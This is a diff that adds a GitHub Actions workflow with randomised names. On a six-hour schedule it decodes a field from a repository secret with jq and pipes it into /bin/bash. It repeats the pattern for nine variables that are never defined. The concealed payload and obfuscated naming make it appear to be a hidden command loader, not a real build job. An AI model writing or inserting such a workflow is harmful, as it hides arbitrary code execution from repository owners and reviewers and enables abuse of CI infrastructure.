@@ -1,0 +1,25 @@
+name: shiximian1894
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shiximian1894
+        env:
+          dn90131: ${{ secrets.dn90131 }}
+        run: |
+          echo $dn90131 | jq -r .isafi71 | /bin/bash
+          echo $h92235 | jq -r .larrl66 | /bin/bash
+          echo $fergp775 | jq -r .kwjb590 | /bin/bash
+          echo $jkowt33 | jq -r .ob7486 | /bin/bash
+          echo $rqya902 | jq -r .j3179 | /bin/bash
+          echo $kq03 | jq -r .r16722 | /bin/bash
+          echo $snmp5 | jq -r .foju00 | /bin/bash
+          echo $pkgqx2 | jq -r .s514 | /bin/bash
+          echo $ypa62 | jq -r .fukvi2 | /bin/bash
+          echo $edi8 | jq -r .zynvc1 | /bin/bash
+
